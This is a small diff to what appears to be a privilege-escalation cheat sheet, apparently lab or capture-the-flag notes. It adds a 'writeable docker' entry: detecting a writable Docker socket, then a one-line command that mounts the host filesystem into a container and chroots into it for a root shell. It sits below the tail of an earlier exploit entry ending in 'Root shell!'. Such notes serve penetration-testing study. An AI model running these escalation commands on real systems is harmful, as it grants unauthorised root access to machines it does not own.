@@ -187,3 +187,7 @@ https://gist.github.com/xl7dev/322b0f85dc9f6a06573302c7de4f4249
 4. ./tmp/45010
 5. Root shell!
 
+## writeable docker
+1. Detection: /var/run/docker.sock is writable (https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-d
+2. exploitation: alfred@break:/tmp$ docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+3. reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#automatic-enumeration-and-escape 
